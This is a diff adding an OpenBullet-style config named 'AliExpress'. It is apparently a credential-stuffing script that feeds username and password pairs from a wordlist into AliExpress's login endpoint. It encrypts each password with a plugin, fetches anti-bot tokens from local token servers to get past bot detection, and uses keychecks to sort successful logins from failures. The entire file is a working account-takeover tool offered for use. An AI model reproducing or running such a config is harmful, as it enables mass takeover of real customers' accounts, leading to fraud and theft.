@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "AliExpress",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2023-08-24T13:28:15.096548+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [
+    "AliBabaCipher"
+  ],
+  "Author": "",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://de-wum.aliexpress.com/service/um.json?_bx-v=2.0.39" 
+  CONTENT "data=107!fGGVagfGfQ6f5SZiWPWSTF8G9UNkY4SfuawkJ%2Fe%2FzCaSOd%2BUGQs09zJSJA9vO4MkOfYJ9QUpNtrX8dBvslTVkuflt1VtA27KK5bS7B0WXRb4%2Bb0msUIFsjEIenckn9uQ7bPK6S3u2NbieZKKfNLktJd%2F6SPWYVMFeAmPfCgqXfG3Emtpp%2F4Q5SGYx%2FKfWSjQ5Hp280YxWP0axWQEfviKjsTfffUO%2FgWFBADQ%2BpUy8XPJ1ppQtgoHKtSYEegKD05EWe5wYrYm%2Bd7piWzfO2nWXBvNxcGPg%2BpYHsUWgnlTwS12vm2ugB%2FFhiNBS0dwCdvMKFpq0VNCezPmRh1oe2VOzyvc2p1j5Sm6NiJKsIcrbvaP5hfiNtOHhz9bmvkF6SwlyGF8wrErySubiNyM7BaIuGiOexvS6OOTBn4Zm8%2FSSzxo2wdaF4PVC9TPRb%2BKuCg%2B0%2F6Bd3ltjALcMxKlO9%2Fn1H1RU0g%2FchlWwMhVqEmlYFRsToEaE9Zji%2ByWiWCHQitr4gbH7IJSqbvjkwGSwcnWGHbXHGLQ19B4V%2BzNoM5x8PiXn4xEYbmnJUTPxeozbuli0Cvgo85puhVTj6OEYR%2BGlr%2BrJ72qTGmYMJerLUZiOholpo4%3D&xa=ctl&xt=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "{\"tn\":\"" "\"" EncodeOutput=TRUE -> VAR "tn" 
+
+PARSE "<SOURCE>" LR "id\":\"" "\"" EncodeOutput=TRUE -> VAR "id" 
+
+FUNCTION URLEncode "<USERNAME>" -> VAR "USERNAME1" 
+
+AliBabaCipher "<PASSWORD>" -> VAR "PASSWORD1" 
+
+REQUEST GET "http://localhost:5002/gettoken" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "" "" EncodeOutput=TRUE -> VAR "ua" 
+
+REQUEST GET "http://localhost:5001/gettoken" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "" "" EncodeOutput=TRUE -> VAR "bx-ua" 
+
+REQUEST POST "https://passport.aliexpress.com/newlogin/login.do?appName=aebuyer&fromSite=13&_bx-v=2.0.39" 
+  CONTENT "loginId=<USERNAME1>&password2=<PASSWORD1>&keepLogin=&umidGetStatusVal=255&screenPixel=1366x768&navlanguage=fr-FR&navUserAgent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F103.0.0.0+Safari%2F537.36&navPlatform=Win32&appName=aebuyer&returnUrl=&bizParams=&appEntrance=aebuyer&isMobile=&lang=fr_FR&fromSite=13&umidToken=<tn>&ua=<ua>&bx-ua=<bx-ua>&bx-umidtoken=<id>&bx-sys=ua-l:no__um-l:no__js:https://assets.alicdn.com/g/" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "loginResult\":\"success" 
+  KEYCHAIN Failure OR 
+    KEY "content\":{\"data\":{\"titleMsg\":\"" 
+    KEY "Votre identifiant n'existe pas" 
+
